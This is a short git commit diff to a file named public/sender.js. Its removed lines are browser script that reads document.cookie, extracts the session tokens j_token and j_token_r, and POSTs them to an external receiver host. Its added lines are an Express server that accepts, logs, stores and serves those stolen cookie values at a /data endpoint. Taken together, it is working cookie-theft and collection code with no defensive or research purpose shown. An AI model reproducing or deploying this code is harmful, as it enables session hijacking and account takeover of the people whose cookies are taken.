ddfcff60fd08b6d13bc7e919e2520739b581a051
maria0024-dot <miladhack2050@proton.me>
2026-06-23 19:19:31 +0330

    Update sender.js

--- public/sender.js
+++ public/sender.js
@@ -1,50 +1,34 @@
-let cookies = {};
+const express = require("express");
+const app = express();
 
-document.cookie.split("; ").forEach(cookie => {
+app.use(express.json());
+app.use(express.static("public"));
 
-    let index = cookie.indexOf("=");
-
-    let key = cookie.substring(0, index);
-    let value = cookie.substring(index + 1);
-
-    cookies[key] = value;
-
-});
-
-
-let data = {
-    j_token: cookies.j_token,
-    j_token_r: cookies.j_token_r
+let lastData = {
+    cookie1: "",
+    cookie2: ""
 };
 
+app.post("/receiver", (req, res) => {
+    console.log("=== DATA RECEIVED ===");
+    console.log(req.body);
 
-console.log(data);
+    lastData.cookie1 = req.body.cookie1 || "";
+    lastData.cookie2 = req.body.cookie2 || "";
 
-fetch("https://receiver-server.vercel.app/receiver", {
-
-        method: "POST",
-
-        headers: {
-            "Content-Type": "application/json"
-        },
-
-        body: JSON.stringify({
-            message: data
-        })
-
-    })
-    .then(async (r) => {
-
-        console.log("Status:", r.status);
-
-        const response = await r.text();
-
-        console.log("Response:", response);
-
-    })
-    .catch(err => {
-
-        console.error("Fetch error:", err);
-
+    res.json({
+        status: "ok"
+    });
 });
 
+app.get("/data", (req, res) => {
+    res.json(lastData);
+});
+
+app.get("/", (req, res) => {
+    res.send("Receiver is running");
+});
+
+app.listen(process.env.PORT || 3000, () => {
+    console.log("Receiver listening");
+});
